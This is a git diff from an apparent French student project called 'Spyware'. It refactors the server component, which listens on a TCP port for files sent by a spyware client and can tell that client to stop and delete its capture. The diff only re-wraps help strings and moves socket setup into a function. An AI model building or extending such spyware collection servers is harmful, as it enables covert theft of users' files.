@@ -14,21 +14,18 @@ TXT_GLOB = ""
 
 def argument():
     p = argparse.ArgumentParser(description='Projet Python - Spyware')
-    p.add_argument('-l', '--listen', action='store_true', help="se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware UP")
-    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le programme")
-    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit être parfaitement lisible")
+    p.add_argument('-l', '--listen', action='store_true', help="se met en écoute sur le port TCP saisi par "
+                                                               "l'utilisateur et attend les données du spyware UP")
+    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
+                                                             "programme")
+    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
+                                                                 "du spyware. Le contenu doit être parfaitement "
+                                                                 "lisible")
     p.add_argument('-k', '--kill', action='store_true',
                    help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
                         "supprimer la capture.")
     args = p.parse_args()
     return args
-
-
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-server_socket.bind(("0.0.0.0", PORT))
-
-server_socket.listen(1)
 
 
 def kill_all():
@@ -60,6 +57,12 @@ def commands(cmd):
 
 
 def receiver(port):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    server_socket.bind(("0.0.0.0", port))
+
+    server_socket.listen(1)
+
     print(f"Ecoute sur {SRV}:{port}")
 
     while True:
